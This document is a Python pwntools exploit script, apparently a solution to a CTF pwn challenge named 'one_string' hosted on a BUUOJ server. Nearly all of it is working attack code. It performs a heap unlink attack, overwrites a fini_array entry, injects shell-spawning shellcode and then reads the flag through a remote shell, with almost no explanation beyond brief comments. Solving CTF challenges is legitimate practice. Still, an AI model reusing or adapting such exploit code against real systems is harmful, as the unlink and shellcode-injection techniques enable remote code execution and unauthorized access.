# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './one_string'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29654'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def add(size , content = 'a'):
    sleep(0.01)
    sl('1')
    sleep(0.01)
    sl(str(size))
    sl(content)

def edit(idx , content = 'a'):
    sleep(0.01)
    sl('3')
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)
    sl(content)

def delete(idx ):
    sleep(0.01)
    sl('2')
    sleep(0.01)
    sl(str(idx))


# one_gad = one_gadget(libc.path)

def attack():
    finit = 0x080E9F74
    ptr_list = 0x080EBA40
    bss_addr = 0x080EB000
    ru('You know all, Please input:')
    add(0x78)
    add(0x78)
    add(0x78)
    # 填一下 size 嘻嘻

    add(0x74) #3
    add(0xfc)
    add(0x20)

    edit(3 , 'a'*0x74)
    payload = flat(
        0 , 0x71 ,
        ptr_list + 0xc - 0xc , ptr_list + 0xc - 0x8,
        '\x00'*0x60,
        0x70
    ) 

    edit(3 , payload )
    delete(4)
    # 经典 unlink 

    edit( 3 , flat(finit , bss_addr) )
    edit( 3 , flat(finit , bss_addr) )
    edit( 0 , flat(bss_addr , bss_addr))

    shellcode = asm(shellcraft.sh())
    edit( 1 , shellcode)
    sl('4')

    ''

attack()
p.success(getShell())
p.interactive()

'''
@File    :   one_string.py
@Time    :   2021/10/28 19:14:13
@Author  :   Niyah 
'''